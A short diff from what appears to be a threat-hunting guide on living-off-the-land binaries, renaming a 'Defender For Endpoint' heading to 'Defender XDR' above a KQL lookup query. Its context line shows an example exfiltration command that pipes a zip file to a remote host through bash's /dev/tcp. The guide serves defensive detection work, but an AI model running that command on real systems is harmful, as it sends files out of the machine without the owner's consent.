@@ -14,7 +14,7 @@ bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
 #### References
 - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
 - https://lolbas-project.github.io/lolbas/Binaries/Bash/
-## Defender For Endpoint
+## Defender XDR
 ```
 // Set the IP address you are trying to lookup.
 let LookupIP = "127.0.0.1";
